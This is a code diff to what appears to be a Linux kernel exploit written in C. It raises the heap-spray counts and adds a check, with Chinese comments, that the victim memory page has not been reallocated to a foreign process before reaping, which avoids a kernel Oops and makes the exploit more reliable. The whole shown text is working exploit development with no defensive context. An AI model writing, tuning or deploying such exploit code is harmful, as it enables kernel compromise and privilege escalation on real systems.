@@ -2188,8 +2188,8 @@ static int stage_write(unsigned long long target, int mode,
 
 #define SPRAY_THREADS 8
 #define SPRAY_SOCKS 2048
-#define SPRAY_PRE 2000
-#define SPRAY_POST 10000
+#define SPRAY_PRE 6000
+#define SPRAY_POST 30000
 static _Atomic int g_burst, g_burst2, g_stop_spray;
 static int g_pool[SPRAY_SOCKS][2];
 static int g_pool_n;
@@ -2270,6 +2270,34 @@ static int scan_page_alloc_ours(const unsigned char *b, size_t n,
         for (int j = 0; j < SPRAY_THREADS; j++)
             if (pid == atomic_load(&g_spray_tids[j]))
                 return 1;
+    }
+    return 0;
+}
+
+/*
+ * 二次校验：hit 判定之后、reap 之前，确认 victim pfn 没有被别的 pid 重新分配。
+ * 如果被系统抢走（比如 memcg 回收线程），此时 reap 会触发 rb_erase Oops，
+ * 必须 park 而不是 waitpid。
+ */
+static int scan_page_alloc_foreign(const unsigned char *b, size_t n,
+                                   unsigned long long pfn)
+{
+    for (size_t i = 16; i + 12 <= n; i += 4)
+    {
+        int pid, ours = 0;
+        if (u64(b, i) != pfn || (int)u32(b, i + 8) != 1)
+            continue;
+        if ((u32(b, i - 8) & 0xffff) != g_t_page_alloc)
+            continue;
+        pid = (int)u32(b, i - 4);
+        for (int j = 0; j < SPRAY_THREADS; j++)
+            if (pid == atomic_load(&g_spray_tids[j]))
+            {
+                ours = 1;
+                break;
+            }
+        if (!ours)
+            return 1;
     }
     return 0;
 }
@@ -2639,6 +2667,22 @@ static void run_plant(unsigned long long target, int tag, int mode,
         park_forever("burst miss");
     }
 
+    /* reap 前二次校验：victim 页若已被他方抢走，绝不 waitpid */
+    {
+        int foreign = 0;
+        for (int cpu = 0; cpu < 8 && !foreign; cpu++)
+        {
+            long m2 = read_fd(g_rawfd[cpu], raw, 32u << 20);
+            if (m2 > 0 && scan_page_alloc_foreign(raw, (size_t)m2, slab_pfn))
+                foreign = 1;
+        }
+        if (foreign)
+        {
+            logf("[-] plant%d victim stolen by foreign pid; parking\n", tag);
+            g_held++;
+            park_forever("victim stolen");
+        }
+    }
     usleep(1000);
     int st = 0;
     waitpid(T, &st, 0);
